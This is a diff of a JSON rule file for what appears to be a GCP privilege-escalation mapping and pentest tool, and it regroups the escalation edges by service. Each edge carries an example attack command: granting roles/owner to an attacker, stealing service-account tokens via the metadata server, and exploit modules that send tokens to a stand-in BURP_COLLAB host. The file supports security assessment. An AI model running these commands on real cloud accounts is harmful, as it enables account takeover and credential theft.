@@ -1,6 +1,6 @@
 {
   "_schema": {
-    "version": "3",
+    "version": "4",
     "single_perm_fields": [
       "permissions",
       "on",
@@ -36,1103 +36,2414 @@
       "description": "Top-level keys other than '_schema' and 'collapsed_role_edges' are edge categories. The pipeline loads 'priv_escalation' by default. Pass --edge-categories to override or add categories (e.g. --edge-categories priv_escalation,sensitive_resource_access, or 'all').",
       "priv_escalation": "Rules that yield direct SA identity assumption: token generation, key creation, IAM modification, code execution paths. Loaded by default.",
       "sensitive_resource_access": "Rules that read sensitive resource data (e.g. Secret Manager payloads) without necessarily granting a new identity. Opt-in via --edge-categories."
-    }
+    },
+    "service_groups": "priv_escalation and sensitive_resource_access now group edges under service sub-keys (e.g. \"compute\", \"gke\"). The parser flattens these transparently \u2014 service keys are invisible to rule matching."
   },
   "priv_escalation": {
-    "CAN_MODIFY_PROJECT_IAM": {
-      "permissions": [
-        "resourcemanager.projects.setIamPolicy"
-      ],
-      "description": "Set the IAM policy on a project, enabling arbitrary role grants to any principal \u2014 including roles/owner on yourself.",
-      "example_command": "gcloud projects set-iam-policy {project_id} policy.json  # or: gcloud projects add-iam-policy-binding {project_id} --member=user:ATTACKER --role=roles/owner",
-      "on": "project"
-    },
-    "CAN_MODIFY_FOLDER_IAM": {
-      "permissions": [
-        "resourcemanager.folders.setIamPolicy"
-      ],
-      "description": "Set the IAM policy on a folder, enabling arbitrary role grants that inherit to all child projects and sub-folders.",
-      "example_command": "gcloud resource-manager folders add-iam-policy-binding {target_resource} --member=user:ATTACKER --role=roles/owner",
-      "on": "folder"
-    },
-    "CAN_MODIFY_ORG_IAM": {
-      "permissions": [
-        "resourcemanager.organizations.setIamPolicy"
-      ],
-      "description": "Set the IAM policy on the organization, granting yourself roles that inherit to every project under this org.",
-      "example_command": "gcloud organizations add-iam-policy-binding {target_resource} --member=user:ATTACKER --role=roles/owner",
-      "on": "org"
-    },
-    "CAN_MODIFY_SA_IAM": {
-      "permissions": [
-        "iam.serviceAccounts.setIamPolicy"
-      ],
-      "on": "service-account",
-      "description": "Set the IAM policy on the target service account, enabling you to grant yourself roles/iam.serviceAccountTokenCreator or roles/iam.serviceAccountUser for impersonation.",
-      "example_command": "gcloud iam service-accounts add-iam-policy-binding {target_sa} --project={project_id} --member=user:ATTACKER --role=roles/iam.serviceAccountTokenCreator"
-    },
-    "CAN_MODIFY_COMPUTE_INSTANCE_IAM": {
-      "permissions": [
-        "compute.instances.setIamPolicy"
-      ],
-      "on": "computeinstance",
-      "description": "Set the IAM policy on a Compute Engine instance, enabling you to grant yourself roles/compute.instanceAdmin or roles that allow SSH access and metadata manipulation.",
-      "example_command": "gcloud compute instances set-iam-policy {target_resource} policy.json --project={project_id}"
-    },
-    "CAN_MODIFY_CLOUD_RUN_FUNCTION_IAM": {
-      "permissions": [
-        "cloudfunctions.functions.setIamPolicy"
-      ],
-      "on": "cloudfunction",
-      "description": "Set the IAM policy on a Cloud Function, enabling you to grant yourself roles/cloudfunctions.invoker or roles/cloudfunctions.developer to invoke or update the function.",
-      "example_command": "gcloud functions set-iam-policy {target_resource} policy.json --project={project_id}  # then invoke to exfil token of the function's SA"
-    },
-    "CAN_MODIFY_SECRET_MANAGER_SECRET_IAM": {
-      "permissions": [
-        "secretmanager.secrets.setIamPolicy"
-      ],
-      "on": "secrets",
-      "description": "Set the IAM policy on a Secret Manager secret, enabling you to grant yourself roles/secretmanager.secretAccessor to read the secret value.",
-      "example_command": "gcloud secrets add-iam-policy-binding {target_resource} --project={project_id} --member=user:ATTACKER --role=roles/secretmanager.secretAccessor && gcloud secrets versions access latest --secret={target_resource} --project={project_id}"
-    },
-    "CAN_IMPERSONATE_SA": {
-      "permissions": [
-        "iam.serviceAccounts.implicitDelegation"
-      ],
-      "on": "service-account",
-      "description": "Obtain tokens for the target SA via implicit delegation \u2014 usable with service account chaining when another SA has getAccessToken on the target.",
-      "example_command": "modules exploit_generate_access_token --delegation {intermediate_sa} --delegation-target {target_sa}  # step through implicit delegation chain; omit --delegation-target to find all chains"
-    },
-    "CAN_CREATE_SA_ACCESS_TOKEN": {
-      "permissions": [
-        "iam.serviceAccounts.getAccessToken"
-      ],
-      "on": "service-account",
-      "description": "Generate a short-lived OAuth 2.0 access token for the target service account, immediately assuming its GCP identity.",
-      "example_command": "modules exploit_generate_access_token --target-sa {target_sa} --project-id {project_id}"
-    },
-    "CAN_SIGN_JWT_AS_SA": {
-      "permissions": [
-        "iam.serviceAccounts.signJwt"
-      ],
-      "on": "service-account",
-      "description": "Call IAM Credentials signJwt to sign a self-assembled JWT as the target SA, then exchange it at the OAuth2 token endpoint (oauth2.googleapis.com/token) for a full access token \u2014 no VM or metadata server required.",
-      "example_command": "modules exploit_sign_jwt_as_sa --target-sa {target_sa} --project-id {project_id} --method signJwt"
-    },
-    "CAN_SIGN_BLOB_AS_SA": {
-      "permissions": [
-        "iam.serviceAccounts.signBlob"
-      ],
-      "on": "service-account",
-      "description": "Call IAM Credentials signBlob to sign a raw JWT header+payload as the target SA, reconstruct the signed JWT, and exchange it at the OAuth2 token endpoint for a full access token \u2014 no VM required.",
-      "example_command": "modules exploit_sign_jwt_as_sa --target-sa {target_sa} --project-id {project_id} --method signBlob"
-    },
-    "CAN_CREATE_SA_OIDC_TOKEN": {
-      "permissions": [
-        "iam.serviceAccounts.getOpenIdToken"
-      ],
-      "on": "service-account",
-      "include_all_only": true,
-      "description": "Generate a Google-signed OIDC identity token (audience-scoped JWT) for the target SA, enabling authentication to private Cloud Run services, Cloud Functions, IAP-protected apps, and any backend trusting Google-signed JWTs. Audience-bound: not a full GCP API access token by itself.",
-      "example_command": "modules exploit_get_oidc_token --target-sa {target_sa} --audience https://TARGET_SERVICE_URL"
-    },
-    "CAN_CREATE_SA_KEY": {
-      "permissions": [
-        "iam.serviceAccountKeys.create"
-      ],
-      "on": "service-account",
-      "description": "Create a long-lived JSON key for the target service account, providing persistent offline access to its GCP identity.",
-      "example_command": "modules exploit_service_account_keys --target-sa {target_sa} --project-id {project_id} --create-key"
-    },
-    "CAN_CREATE_SA_HMAC_KEY": {
-      "permissions": [
-        "storage.hmacKeys.create"
-      ],
-      "on": "service-account",
-      "include_all_only": true,
-      "description": "Create an HMAC key pair for the target SA, yielding a persistent, non-expiring S3-compatible credential that authenticates as the SA to the Cloud Storage XML/S3 API only. Not a full GCP API access token.",
-      "example_command": "modules exploit_storage_hmac --sa-email {target_sa} --create"
-    },
-    "CAN_CREATE_CLOUDBUILD_DEFAULT_IDENTITY": {
-      "permissions": [
-        "cloudbuild.builds.create"
-      ],
-      "description": "Submit a Cloud Build job that executes arbitrary code as the project's Cloud Build service account (PROJECT_NUMBER@cloudbuild.gserviceaccount.com). The token is exfiltrable from job logs.",
-      "example_command": "modules exploit_cloudbuild_build_as_sa --project-id {project_id} --exfil-mode logs --inline-script \"curl -sf -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\""
-    },
-    "RESET_COMPUTE_STARTUP_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "compute.instances.get",
-            "compute.instances.setMetadata",
-            "compute.instances.reset"
-          ],
-          "on": "computeinstance",
-          "status_in": [
-            "RUNNING"
-          ]
-        }
-      ],
-      "edge": "RESET_COMPUTE_STARTUP_SA",
-      "via": "resource",
-      "act_as": {
+    "iam": {
+      "CAN_IMPERSONATE_SA": {
         "permissions": [
-          "iam.serviceAccounts.actAs"
+          "iam.serviceAccounts.implicitDelegation"
         ],
-        "on": "service-account"
+        "on": "service-account",
+        "description": "Obtain tokens for the target SA via implicit delegation \u2014 usable with service account chaining when another SA has getAccessToken on the target.",
+        "example_command": "modules exploit_generate_access_token --delegation {intermediate_sa} --delegation-target {target_sa}  # step through implicit delegation chain; omit --delegation-target to find all chains"
       },
-      "description": "Inject a startup script into a RUNNING Compute Engine instance's metadata, then reset (reboot) it to execute arbitrary code as the instance's attached service account.",
-      "example_command": "modules exploit_compute_instance_as_sa --project-id {project_id} --instance-name {target_resource} --exfil-url https://BURP_COLLAB --mode startup-script"
-    },
-    "START_COMPUTE_STARTUP_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "compute.instances.get",
-            "compute.instances.setMetadata",
-            "compute.instances.start"
-          ],
-          "on": "computeinstance",
-          "status_in": [
-            "STOPPED"
-          ]
-        }
-      ],
-      "edge": "START_COMPUTE_STARTUP_SA",
-      "via": "resource",
-      "act_as": {
+      "CAN_CREATE_SA_ACCESS_TOKEN": {
         "permissions": [
-          "iam.serviceAccounts.actAs"
+          "iam.serviceAccounts.getAccessToken"
         ],
-        "on": "service-account"
+        "on": "service-account",
+        "description": "Generate a short-lived OAuth 2.0 access token for the target service account, immediately assuming its GCP identity.",
+        "example_command": "modules exploit_generate_access_token --target-sa {target_sa} --project-id {project_id}"
       },
-      "description": "Inject a startup script into a STOPPED Compute Engine instance's metadata, then start it to execute code as the instance's attached service account.",
-      "example_command": "modules exploit_compute_instance_as_sa --project-id {project_id} --instance-name {target_resource} --exfil-url https://BURP_COLLAB --mode startup-script"
-    },
-    "INJECT_SSH_KEY_PROJECT_METADATA": {
-      "requires": [
-        {
-          "permissions": [
-            "compute.projects.setCommonInstanceMetadata"
-          ]
-        }
-      ],
-      "edge": "INJECT_SSH_KEY_PROJECT_METADATA",
-      "via": "capability",
-      "act_as": {
+      "CAN_SIGN_JWT_AS_SA": {
         "permissions": [
-          "iam.serviceAccounts.actAs"
+          "iam.serviceAccounts.signJwt"
         ],
-        "on": "service-account"
+        "on": "service-account",
+        "description": "Call IAM Credentials signJwt to sign a self-assembled JWT as the target SA, then exchange it at the OAuth2 token endpoint (oauth2.googleapis.com/token) for a full access token \u2014 no VM or metadata server required.",
+        "example_command": "modules exploit_sign_jwt_as_sa --target-sa {target_sa} --project-id {project_id} --method signJwt"
       },
-      "description": "Write an attacker SSH public key into the project-level common instance metadata (ssh-keys entry), granting SSH login to all project VMs that inherit project metadata. From any VM, steal the attached SA's credentials via the local GCE metadata endpoint.",
-      "example_command": "modules exploit_instance_ssh_keys --project-id {project_id} --project-level --ssh-pub-key ATTACKER_PUB_KEY",
-      "capability_resource_type": "project"
-    },
-    "IAP_TUNNEL_TO_VM_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "iap.tunnelInstances.accessViaIAP",
-            "compute.instances.get"
-          ],
-          "on": "computeinstance",
-          "status_in": [
-            "RUNNING"
-          ]
-        }
-      ],
-      "edge": "IAP_TUNNEL_TO_VM_SA",
-      "via": "resource",
-      "act_as": {
+      "CAN_SIGN_BLOB_AS_SA": {
         "permissions": [
-          "iam.serviceAccounts.actAs"
+          "iam.serviceAccounts.signBlob"
         ],
-        "on": "service-account"
+        "on": "service-account",
+        "description": "Call IAM Credentials signBlob to sign a raw JWT header+payload as the target SA, reconstruct the signed JWT, and exchange it at the OAuth2 token endpoint for a full access token \u2014 no VM required.",
+        "example_command": "modules exploit_sign_jwt_as_sa --target-sa {target_sa} --project-id {project_id} --method signBlob"
       },
-      "description": "Tunnel into a running Compute VM via IAP (Identity-Aware Proxy) and steal the attached SA's credentials from the GCE metadata endpoint, or execute code directly as that SA.",
-      "example_command": "modules exploit_iap_tunnel_vm_sa --instance-name {target_resource} --zone us-central1-a"
-    },
-    "CREATE_AND_INVOKE_CLOUDFUNCTION_AS_SA": {
-      "requires": [
-        {
+      "CAN_CREATE_SA_OIDC_TOKEN": {
+        "permissions": [
+          "iam.serviceAccounts.getOpenIdToken"
+        ],
+        "on": "service-account",
+        "include_all_only": true,
+        "description": "Generate a Google-signed OIDC identity token (audience-scoped JWT) for the target SA, enabling authentication to private Cloud Run services, Cloud Functions, IAP-protected apps, and any backend trusting Google-signed JWTs. Audience-bound: not a full GCP API access token by itself.",
+        "example_command": "modules exploit_get_oidc_token --target-sa {target_sa} --audience https://TARGET_SERVICE_URL"
+      },
+      "CAN_CREATE_SA_KEY": {
+        "permissions": [
+          "iam.serviceAccountKeys.create"
+        ],
+        "on": "service-account",
+        "description": "Create a long-lived JSON key for the target service account, providing persistent offline access to its GCP identity.",
+        "example_command": "modules exploit_service_account_keys --target-sa {target_sa} --project-id {project_id} --create-key"
+      },
+      "CAN_CREATE_SA_HMAC_KEY": {
+        "permissions": [
+          "storage.hmacKeys.create"
+        ],
+        "on": "project",
+        "include_all_only": true,
+        "description": "Create an HMAC key pair for the target SA, yielding a persistent, non-expiring S3-compatible credential that authenticates as the SA to the Cloud Storage XML/S3 API only. Not a full GCP API access token.",
+        "example_command": "modules exploit_storage_hmac --sa-email {target_sa} --create"
+      },
+      "UPDATE_CUSTOM_ROLE_ADD_PERMISSIONS": {
+        "permissions": [
+          "iam.roles.update"
+        ],
+        "on": "project",
+        "prerequisite_binding": "source_must_hold_custom_role",
+        "description": "Update a custom IAM role that SOURCE IS ALREADY ASSIGNED (holds an IAM binding to) in the project to add any desired permission (e.g., iam.serviceAccounts.actAs, resourcemanager.projects.setIamPolicy). Without holding a binding to the custom role being updated, this permission provides no direct privilege escalation \u2014 updating a custom role only benefits principals who hold that role. Effective direct escalation to any SA or project-wide IAM control. Documented in Rhino Security Labs GCP IAM privilege escalation writeup.",
+        "example_command": "gcloud iam roles update CUSTOM_ROLE --project=PROJECT_ID --add-permissions=iam.serviceAccounts.actAs",
+        "via": "capability",
+        "schema_note": "Self-escalation via custom role mutation. Graph builder must verify source holds a binding to the custom role being updated before emitting this edge. The prerequisite_binding field is a hint \u2014 the current graph builder does not enforce it automatically.",
+        "status": "PROPOSED"
+      },
+      "CAN_MODIFY_PROJECT_IAM": {
+        "permissions": [
+          "resourcemanager.projects.setIamPolicy"
+        ],
+        "description": "Set the IAM policy on a project, enabling arbitrary role grants to any principal \u2014 including roles/owner on yourself.",
+        "example_command": "gcloud projects set-iam-policy {project_id} policy.json  # or: gcloud projects add-iam-policy-binding {project_id} --member=user:ATTACKER --role=roles/owner",
+        "on": "project"
+      },
+      "CAN_MODIFY_FOLDER_IAM": {
+        "permissions": [
+          "resourcemanager.folders.setIamPolicy"
+        ],
+        "description": "Set the IAM policy on a folder, enabling arbitrary role grants that inherit to all child projects and sub-folders.",
+        "example_command": "gcloud resource-manager folders add-iam-policy-binding {target_resource} --member=user:ATTACKER --role=roles/owner",
+        "on": "folder"
+      },
+      "CAN_MODIFY_ORG_IAM": {
+        "permissions": [
+          "resourcemanager.organizations.setIamPolicy"
+        ],
+        "description": "Set the IAM policy on the organization, granting yourself roles that inherit to every project under this org.",
+        "example_command": "gcloud organizations add-iam-policy-binding {target_resource} --member=user:ATTACKER --role=roles/owner",
+        "on": "org"
+      },
+      "CAN_MODIFY_SA_IAM": {
+        "permissions": [
+          "iam.serviceAccounts.setIamPolicy"
+        ],
+        "on": "service-account",
+        "description": "Set the IAM policy on the target service account, enabling you to grant yourself roles/iam.serviceAccountTokenCreator or roles/iam.serviceAccountUser for impersonation.",
+        "example_command": "gcloud iam service-accounts add-iam-policy-binding {target_sa} --project={project_id} --member=user:ATTACKER --role=roles/iam.serviceAccountTokenCreator"
+      },
+      "CAN_MODIFY_COMPUTE_INSTANCE_IAM": {
+        "permissions": [
+          "compute.instances.setIamPolicy"
+        ],
+        "on": "computeinstance",
+        "description": "Set the IAM policy on a Compute Engine instance, enabling you to grant yourself roles/compute.instanceAdmin or roles that allow SSH access and metadata manipulation.",
+        "example_command": "gcloud compute instances set-iam-policy {target_resource} policy.json --project={project_id}"
+      },
+      "CAN_MODIFY_CLOUD_RUN_FUNCTION_IAM": {
+        "permissions": [
+          "cloudfunctions.functions.setIamPolicy"
+        ],
+        "on": "cloudfunction",
+        "description": "Set the IAM policy on a Cloud Function, enabling you to grant yourself roles/cloudfunctions.invoker or roles/cloudfunctions.developer to invoke or update the function.",
+        "example_command": "gcloud functions set-iam-policy {target_resource} policy.json --project={project_id}  # then invoke to exfil token of the function's SA"
+      },
+      "CAN_MODIFY_SECRET_MANAGER_SECRET_IAM": {
+        "permissions": [
+          "secretmanager.secrets.setIamPolicy"
+        ],
+        "on": "secrets",
+        "description": "Set the IAM policy on a Secret Manager secret, enabling you to grant yourself roles/secretmanager.secretAccessor to read the secret value.",
+        "example_command": "gcloud secrets add-iam-policy-binding {target_resource} --project={project_id} --member=user:ATTACKER --role=roles/secretmanager.secretAccessor && gcloud secrets versions access latest --secret={target_resource} --project={project_id}"
+      },
+      "CONFIGURE_WORKLOAD_IDENTITY_IMPERSONATION": {
+        "requires": [
+          {
+            "permissions": [
+              "iam.workloadIdentityPools.create",
+              "iam.workloadIdentityPoolProviders.create"
+            ]
+          }
+        ],
+        "edge": "CONFIGURE_WORKLOAD_IDENTITY_IMPERSONATION",
+        "via": "capability",
+        "act_as": {
           "permissions": [
-            "cloudfunctions.functions.create",
-            "cloudfunctions.functions.sourceCodeSet"
+            "iam.serviceAccounts.actAs"
           ],
-          "on": "cloudfunction"
+          "on": "service-account"
         },
-        {
-          "permissions": [
-            "cloudfunctions.functions.call"
-          ],
-          "on": "cloudfunction"
-        }
-      ],
-      "edge": "CREATE_AND_INVOKE_CLOUDFUNCTION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Deploy a new Cloud Function bound to the target SA and invoke it to execute arbitrary code and exfiltrate the SA's OAuth token.",
-      "example_command": "modules exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "cloudfunction"
+        "description": "Create a Workload Identity Pool and OIDC provider that allows an external identity to impersonate the target SA. Combined with roles/iam.serviceAccountAdmin or setIamPolicy on the SA (covered by CAN_MODIFY_SA_IAM), the attacker establishes persistent token exchange that survives revocation of the initial credentials.",
+        "example_command": "modules exploit_wif_impersonation --target-sa {target_sa} --mode setup --project-id {project_id}",
+        "capability_resource_type": "workloadidentityprovider"
+      }
     },
-    "UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA": {
-      "requires": [
-        {
+    "iam_v3_access_policy": {
+      "CAN_CREATE_ACCESS_POLICY_BINDING_PROJECT": {
+        "permissions": [
+          "resourcemanager.projects.createPolicyBinding"
+        ],
+        "on": "project",
+        "description": "Create an ACCESS-kind v3 policy binding on the project, granting eventarc.googleapis.com/messageBuses.publish to any target principal. Live-validated 2026-09-28: the v3 ACCESS policy API enforces a strict permission allowlist \u2014 only messageBuses.publish is accepted; attempts to grant arbitrary GCP permissions (setIamPolicy, actAs, etc.) are rejected with 'permission is not allowed'. Enables an attacker to grant themselves or a controlled principal Eventarc message bus publish access, which can trigger code execution on subscribed Cloud Run services or Cloud Functions running as higher-privilege SAs.",
+        "example_command": "modules exploit_gcp_updatepolicybinding --service project --id PROJECT_ID create-access-policy --subject user:ATTACKER_EMAIL",
+        "status": "VALIDATED"
+      },
+      "CAN_CREATE_ACCESS_POLICY_BINDING_FOLDER": {
+        "permissions": [
+          "resourcemanager.folders.createPolicyBinding"
+        ],
+        "on": "folder",
+        "description": "Create an ACCESS-kind v3 policy binding on the folder, granting eventarc.googleapis.com/messageBuses.publish to any target principal within the folder scope. Live-validated 2026-09-28: same allowlist restriction as project-level \u2014 only messageBuses.publish is accepted.",
+        "example_command": "modules exploit_gcp_updatepolicybinding --service folder --id FOLDER_ID create-access-policy --subject user:ATTACKER_EMAIL",
+        "status": "VALIDATED"
+      },
+      "CAN_CREATE_ACCESS_POLICY_BINDING_ORG": {
+        "permissions": [
+          "resourcemanager.organizations.createPolicyBinding"
+        ],
+        "on": "org",
+        "description": "Create an ACCESS-kind v3 policy binding at the organization level, granting eventarc.googleapis.com/messageBuses.publish to any target principal across the entire org. Live-validated 2026-09-28: same allowlist restriction \u2014 only messageBuses.publish is accepted.",
+        "example_command": "modules exploit_gcp_updatepolicybinding --service org --id ORG_ID create-access-policy --subject user:ATTACKER_EMAIL",
+        "status": "VALIDATED"
+      },
+      "CAN_UPDATE_ACCESS_POLICY_BINDING_PROJECT": {
+        "permissions": [
+          "resourcemanager.projects.updatePolicyBinding"
+        ],
+        "on": "project",
+        "description": "Update an existing ACCESS-kind v3 policy binding on the project \u2014 e.g., modify the binding's principalSet to add the attacker as a subject, gaining eventarc.googleapis.com/messageBuses.publish. Live-validated 2026-09-28: updatePolicyBinding is accepted for ACCESS-kind bindings; the underlying ACCESS policy is still restricted to messageBuses.publish only.",
+        "example_command": "modules exploit_gcp_updatepolicybinding --service project --id PROJECT_ID update --binding-id BINDING_ID",
+        "status": "VALIDATED"
+      },
+      "CAN_UPDATE_ACCESS_POLICY_BINDING_FOLDER": {
+        "permissions": [
+          "resourcemanager.folders.updatePolicyBinding"
+        ],
+        "on": "folder",
+        "description": "Update an existing ACCESS-kind v3 policy binding on the folder \u2014 modify the principalSet to add the attacker, gaining eventarc.googleapis.com/messageBuses.publish within the folder scope. Live-validated 2026-09-28: updatePolicyBinding is accepted for ACCESS-kind bindings.",
+        "example_command": "modules exploit_gcp_updatepolicybinding --service folder --id FOLDER_ID update --binding-id BINDING_ID",
+        "status": "VALIDATED"
+      },
+      "CAN_UPDATE_ACCESS_POLICY_BINDING_ORG": {
+        "permissions": [
+          "resourcemanager.organizations.updatePolicyBinding"
+        ],
+        "on": "org",
+        "description": "Update an existing ACCESS-kind v3 policy binding at the org level \u2014 modify the principalSet to add the attacker, gaining eventarc.googleapis.com/messageBuses.publish org-wide. Live-validated 2026-09-28: updatePolicyBinding is accepted for ACCESS-kind bindings.",
+        "example_command": "modules exploit_gcp_updatepolicybinding --service org --id ORG_ID update --binding-id BINDING_ID",
+        "status": "VALIDATED"
+      }
+    },
+    "compute": {
+      "RESET_COMPUTE_STARTUP_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "compute.instances.get",
+              "compute.instances.setMetadata",
+              "compute.instances.reset"
+            ],
+            "on": "computeinstance",
+            "status_in": [
+              "RUNNING"
+            ]
+          }
+        ],
+        "edge": "RESET_COMPUTE_STARTUP_SA",
+        "via": "resource",
+        "act_as": {
           "permissions": [
-            "cloudfunctions.functions.update",
-            "cloudfunctions.functions.sourceCodeSet"
+            "iam.serviceAccounts.actAs"
           ],
-          "on": "cloudfunction"
+          "on": "service-account"
         },
-        {
+        "description": "Inject a startup script into a RUNNING Compute Engine instance's metadata, then reset (reboot) it to execute arbitrary code as the instance's attached service account.",
+        "example_command": "modules exploit_compute_instance_as_sa --project-id {project_id} --instance-name {target_resource} --exfil-url https://BURP_COLLAB --mode startup-script"
+      },
+      "START_COMPUTE_STARTUP_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "compute.instances.get",
+              "compute.instances.setMetadata",
+              "compute.instances.start"
+            ],
+            "on": "computeinstance",
+            "status_in": [
+              "STOPPED"
+            ]
+          }
+        ],
+        "edge": "START_COMPUTE_STARTUP_SA",
+        "via": "resource",
+        "act_as": {
           "permissions": [
-            "cloudfunctions.functions.call"
+            "iam.serviceAccounts.actAs"
           ],
-          "on": "cloudfunction"
-        }
-      ],
-      "edge": "UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Update an existing Cloud Function to swap in malicious code bound to the target SA, then invoke it to exfiltrate the SA's OAuth token.",
-      "example_command": "modules exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --exfil-url https://BURP_COLLAB",
-      "requires_resource_exists": true,
-      "capability_resource_type": "cloudfunction"
-    },
-    "CREATE_CLOUDSCHEDULER_JOB_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "cloudscheduler.jobs.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_CLOUDSCHEDULER_JOB_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Scheduler job that calls any googleapis.com REST endpoint authenticated as the target SA, enabling token exfil or direct privilege escalation.",
-      "example_command": "modules exploit_cloudscheduler_job --project-id {project_id} --target-sa {target_sa} --action custom --custom-url https://BURP_COLLAB --run",
-      "capability_resource_type": "cloudschedulerjob"
-    },
-    "CREATE_CLOUDBUILD_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "cloudbuild.builds.create"
-          ],
-          "on": "cloudbuildbuild"
-        }
-      ],
-      "edge": "CREATE_CLOUDBUILD_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Submit a Cloud Build build pinned to the target SA, running arbitrary build steps that execute code with that SA's credentials.",
-      "example_command": "modules exploit_cloudbuild_build_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "cloudbuildbuild"
-    },
-    "CREATE_CLOUDRUN_SERVICE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "run.services.create"
-          ],
-          "on": "cloudrunservice"
-        }
-      ],
-      "edge": "CREATE_CLOUDRUN_SERVICE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Deploy a Cloud Run service bound to the target SA and invoke it to execute arbitrary code and exfiltrate the SA's OAuth token.",
-      "example_command": "modules exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --invoke --cleanup",
-      "capability_resource_type": "cloudrunservice"
-    },
-    "UPDATE_CLOUDRUN_SERVICE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "run.services.update"
-          ],
-          "on": "cloudrunservice"
-        }
-      ],
-      "edge": "UPDATE_CLOUDRUN_SERVICE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Update an existing Cloud Run service to swap in a malicious container image bound to the target SA, then invoke it to exfiltrate the SA's OAuth token from the GCE metadata endpoint.",
-      "example_command": "modules exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --update-existing --service-name EXISTING_SERVICE --exfil-url https://BURP_COLLAB --invoke --cleanup",
-      "requires_resource_exists": true,
-      "capability_resource_type": "cloudrunservice"
-    },
-    "CREATE_CLOUDRUN_JOB_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "run.jobs.create"
-          ],
-          "on": "cloudrunjob"
-        }
-      ],
-      "edge": "CREATE_CLOUDRUN_JOB_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create and execute a Cloud Run Job bound to the target SA, running arbitrary container code that steals the SA's OAuth token from the GCE metadata endpoint.",
-      "example_command": "modules exploit_cloudrun_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "cloudrunjob"
-    },
-    "UPDATE_CLOUDRUN_JOB_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "run.jobs.update",
-            "run.jobs.run"
-          ],
-          "on": "cloudrunjob"
-        }
-      ],
-      "edge": "UPDATE_CLOUDRUN_JOB_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Update an existing Cloud Run Job to replace its container image and service account with the target SA, then execute it to steal the SA's OAuth token via the GCE metadata endpoint.",
-      "example_command": "modules exploit_cloudrun_job_as_sa --target-sa {target_sa} --update-existing --job-name EXISTING_JOB --exfil-url https://BURP_COLLAB",
-      "requires_resource_exists": true,
-      "capability_resource_type": "cloudrunjob"
-    },
-    "CREATE_CLOUDRUN_WORKERPOOL_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "run.workerPools.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_CLOUDRUN_WORKERPOOL_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Run Worker Pool bound to the target SA, hosting long-running background containers that exfiltrate the SA's credentials from the metadata server.",
-      "example_command": "modules exploit_cloudrun_workerpool_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "cloudrunworkerpool"
-    },
-    "CREATE_CLOUDTASKS_TASK_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "cloudtasks.queues.create",
-            "cloudtasks.tasks.create"
-          ],
-          "on": "cloudtasksqueue"
-        }
-      ],
-      "edge": "CREATE_CLOUDTASKS_TASK_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Tasks queue and HTTP task authenticated as the target SA, posting the SA's Bearer token to a callback URL or calling a privileged googleapis.com endpoint.",
-      "example_command": "modules exploit_cloudtasks_task_as_sa --target-sa {target_sa} --action callback --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "cloudtasksqueue"
-    },
-    "CREATE_CLOUDWORKFLOWS_EXECUTION_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "workflows.workflows.create",
-            "workflows.executions.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_CLOUDWORKFLOWS_EXECUTION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Workflow bound to the target SA and execute it, running arbitrary HTTP steps with the SA's OAuth credentials to exfiltrate a token or call privileged APIs.",
